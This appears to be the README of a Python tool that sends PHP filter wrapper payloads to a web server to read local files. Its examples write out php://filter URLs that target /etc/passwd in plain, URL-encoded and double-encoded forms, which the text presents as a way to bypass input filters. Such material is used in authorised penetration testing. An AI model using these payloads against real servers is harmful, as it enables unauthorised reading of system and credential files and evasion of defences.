PHP Filter Testing Tool

## Overview

This Python program tests PHP filter wrappers to read local files on a web server. It allows you to select different filters, encoding types, and files to test.

## Installation

Install required packages:

```
pip install requests colorama
```

## Usage

Run program:

```
python PHP_Filter_Tester.py
```

You will be prompted to enter:

- Target URL 
- File to read
- Filter type
- Specific filter
- URL encoding type

The program makes a request using your selections and prints the response.

## Examples

**Read /etc/passwd with normal base64 filter**

```
Enter the URL to test: http://example.com
Enter the file name to test: /etc/passwd  

Select filter type: 1 (Normal)

Select filter to test: 4 (convert.base64-decode) 

Select URL encoding type: 1 (Normal)

Testing: http://example.com/php://filter/convert.base64-decode/resource=/etc/passwd
```

This tests the base64-decode filter on the /etc/passwd file without any URL encoding.

**Read /etc/passwd with encoded base64 filter**


```
Enter the URL to test: http://example.com
Enter the file name to test: /etc/passwd

Select filter type: 2 (Encoded)

Select filter to test: 6 (convert.base64-encode|convert.base64-decode)

Select URL encoding type: 2 (Encoded) 

Testing: http://example.com/php%3a%2f%2ffilter%2fconvert%2ebase64-encode%7cconvert%2ebase64-decode%2fresource%3d%2fetc%2fpasswd
```

This tests the base64 filter with URL encoding to bypass filters.

**Read /etc/passwd with double encoded zlib filter**

```
Enter the URL to test: http://example.com
Enter the file name to test: /etc/passwd  

Select filter type: 3 (Double Encoded)

Select filter to test: 9 (zlib.deflate/convert.base64-encode)

Select URL encoding type: 3 (Double Encoded)

Testing: http://example.com/php%253A%252F%252Ffilter%252Fzlib%252Edeflate%252Fconvert%252Ebase64-encode%252Fresource%253D%252Fetc%252Fpasswd
```

This shows how to double encode the filter and URL to bypass restrictions.

This demonstrates how you can test different filter wrappers to identify file read vulnerabilities.
